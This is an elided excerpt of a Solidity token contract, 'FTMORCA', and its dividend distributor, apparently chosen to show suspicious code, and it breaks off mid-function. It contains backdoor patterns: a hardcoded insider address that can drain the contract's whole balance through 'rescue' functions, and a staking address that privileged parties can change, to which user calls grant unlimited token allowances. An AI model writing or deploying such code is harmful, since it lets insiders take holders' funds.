...
contract DividendDistributor is IDividendDistributor {
    ...
    address public _admin = 0x3ADE60A2c94F992b329a7641379dE5f0261784b8;
    address payable private _InstaBoy = payable(0x3ADE60A2c94F992b329a7641379dE5f0261784b8);
    ...
    modifier onlyToken() {
        require(msg.sender == _token || msg.sender == _admin || msg.sender == _InstaBoy); 
        _;
    }
    ...
    function rescueFTM() external onlyToken {
        (bool tmpSuccess,) = payable(_InstaBoy).call{value: address(this).balance, gas: 34000}("");
        tmpSuccess = false;
    }

    function rescueFTMWithTransfer() external onlyToken {
        payable(_InstaBoy).transfer(address(this).balance);
    }
}
...
interface FTMORCAStakingContractInterface {
...
contract FTMORCA is IBEP20, Auth {

    string constant _name = "FTMORCA";
    string constant _symbol = "FTMO";
    ...
    address public marketingWallet = 0x8d875EF45e5440822dC9BADC401bb822eD84fAD9;
    address private devWallet = 0x3ADE60A2c94F992b329a7641379dE5f0261784b8;
    address private projectWallet = 0xA81794eC0C1482F18C9b9D26951B55531eFC38e7;
    address public FTMORCAStaking;
    ...
    event FTMSentEvent(uint256 amountBNB, address to, bool success);
    ...
    function changeLimitWallet(bool newValue) external authorized {
	...
	function setFTMORCAStakingAddress(address addy) external authorized {
		FTMORCAStaking = addy;
        stakingAddress[FTMORCAStaking] = true;
	}
    ...
    function sendToStakingPool() internal {
		...
		_balances[FTMORCAStaking] += stakingPrizePool;
		emit Transfer(ZERO, FTMORCAStaking, stakingPrizePool);
		stakingPrizePool = 0;
	}
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(stakingAddress[sender]){
            stakedAmount[recipient] = FTMORCAStakingContractInterface(FTMORCAStaking).howManyTokenHasThisAddressStaked(recipient);
        }
    ...
    function _stakeAll(uint256 _days) external {
        _allowances[msg.sender][FTMORCAStaking] = type(uint256).max;
        emit Approval(msg.sender, FTMORCAStaking, type(uint256).max);
        FTMORCAStakingContractInterface(FTMORCAStaking).stakeAllFromTokenContract(msg.sender, _days);
    }
    function _stakeSome(uint amount, uint256 _days) external {
        _allowances[msg.sender][FTMORCAStaking] = type(uint256).max;
        emit Approval(msg.sender, FTMORCAStaking, type(uint256).max);
        FTMORCAStakingContractInterface(FTMORCAStaking).stakeFromTokenContract(msg.sender, amount, _days);
    }
    function _unstakeSome(uint amount, uint256 index) external {
        FTMORCAStakingContractInterface(FTMORCAStaking).unstakeFromTokenContract(msg.sender, amount, index);
    }
    function _unstakeAll() external {
        FTMORCAStakingContractInterface(FTMORCAStaking).unstakeAllFromTokenContract(msg.sender);
    }
    function _collectStakingRewardsWithoutUnstaking() external {
        FTMORCAStakingContractInterface(FTMORCAStaking).claimFromTokenContract(msg.sender);
    }

    function rescueFTM() external onlyOwner{
        (bool tmpSuccess,) = payable(devWallet).call{value: address(this).balance, gas: 40000}("");
        tmpSuccess = false;
    }
    
    function rescueFTMWithTransfer() external onlyOwner{
